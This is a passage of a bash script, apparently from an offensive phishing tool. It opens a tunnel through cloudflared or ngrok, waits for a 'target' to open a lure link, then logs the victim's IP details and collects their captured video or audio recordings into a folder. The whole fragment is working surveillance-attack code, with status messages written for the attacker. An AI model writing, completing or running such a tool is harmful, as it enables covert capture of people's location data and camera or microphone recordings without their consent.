if ! ( $cfcheck && $ngrokcheck ); then
    echo -e "${error}Tunneling has failed! Start your own tunneling service at port ${PORT}!\n"
    break
fi
done
sleep 1
rm -rf ip.txt log.txt
echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}Target has opened the link!\n"
        while IFS= read -r line; do
            echo -e "${green}[${blue}*${green}]${yellow} $line"
        done < ip.txt
        echo ""
        cat ip.txt >> $cwd/ip.txt
        rm -rf ip.txt
    fi
    sleep 0.5
    if [[ -e "log.txt" ]]; then
        echo -e "\007${success}Video/Audio has been downloaded! Check directory!\n"
        file=$(ls | grep webm || ls | grep mp4 || ls | grep mkv || ls | grep gif || ls | grep ogg || ls | grep wav)
        if ! [ -z $file ]; then
            mv -f $file $FOL
        fi
        rm -rf log.txt
    fi
    sleep 0.5
done


